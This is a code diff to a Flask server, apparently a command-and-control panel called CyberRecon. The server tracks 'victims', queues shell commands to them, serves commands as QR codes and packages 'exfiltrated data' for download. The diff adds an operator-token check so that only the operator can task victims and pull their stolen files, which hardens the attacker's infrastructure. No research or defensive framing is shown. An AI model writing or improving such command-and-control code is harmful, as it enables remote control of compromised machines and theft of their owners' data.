@@ -11,13 +11,46 @@ import time
 import uuid
 import threading
 import zipfile
+import os
+from functools import wraps
 from datetime import datetime
 from flask import Flask, jsonify, send_file, request, render_template_string
 from io import BytesIO
 import qrcode
 from qrcode.constants import ERROR_CORRECT_H
 
+
 app = Flask(__name__)
+
+
+# ======== AUTHENTICATION ========
+# Operator API token — set via env var. If not set and REQUIRE_AUTH=true,
+# protected endpoints return 401 (fail-closed).
+OPERATOR_TOKEN = os.getenv("CYBERRECON_OPERATOR_TOKEN", "")
+REQUIRE_AUTH = os.getenv("CYBERRECON_REQUIRE_AUTH", "true").lower() == "true"
+
+
+def require_operator_token(f):
+    """
+    Decorator: reject requests without a valid X-Operator-Token header.
+
+    Enforcement is on by default. Set CYBERRECON_REQUIRE_AUTH=false for
+    isolated local dev only — NEVER in production.
+    """
+    @wraps(f)
+    def wrapper(*args, **kwargs):
+        if not REQUIRE_AUTH:
+            return f(*args, **kwargs)
+        if not OPERATOR_TOKEN:
+            return jsonify({
+                "error": "Server misconfigured: CYBERRECON_OPERATOR_TOKEN not set"
+            }), 503
+        token = request.headers.get("X-Operator-Token", "")
+        if not token or token != OPERATOR_TOKEN:
+            return jsonify({"error": "Unauthorized"}), 401
+        return f(*args, **kwargs)
+    return wrapper
+
 
 # In-memory storage
 victims = {}
@@ -112,6 +145,7 @@ def get_qr_command(victim_id):
     return send_file(buf, mimetype="image/png")
 
 @app.route("/command/<victim_id>", methods=["POST"])
+@require_operator_token
 def queue_command(victim_id):
     data = request.get_json() or {}
     cmd_name = data.get("command", "whoami")
@@ -244,6 +278,7 @@ def health_check():
 # ======== BULK DOWNLOAD ENDPOINT ========
 
 @app.route("/download-all/<victim_id>")
+@require_operator_token
 def download_all_data(victim_id):
     """Package all exfiltrated data as a ZIP file."""
     with victims_lock:
